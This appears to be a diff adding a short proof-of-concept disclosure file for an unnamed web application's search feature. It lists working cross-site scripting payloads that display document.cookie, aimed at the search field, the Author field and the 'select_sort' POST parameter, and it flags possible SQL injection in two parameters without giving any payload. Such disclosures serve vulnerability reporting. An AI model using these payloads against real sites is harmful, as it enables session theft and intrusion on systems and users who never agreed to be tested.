@@ -1,0 +1,14 @@
+==================
+PoC-Exploit
+==================
+
+// xss
+Search-Field -> '"</script><script>alert(document.cookie)</script>
+Search-Field -> Advanced Search -> Author -> '"</script><script>alert(document.cookie)</script>
+Search-Field -> Advanced Search -> POST-Parameter 'select_sort' -> ><iMg src=N onerror=alert(document.cookie)>
+
+// possible SQL-Injection 
+
+Search-Field -> Advanced Search -> POST-Parameter 'select_sort' -> [sql-injection]
+Search-Field -> Advanced Search -> POST-Parameter 'opt_search_select' -> [sql-injection]
+
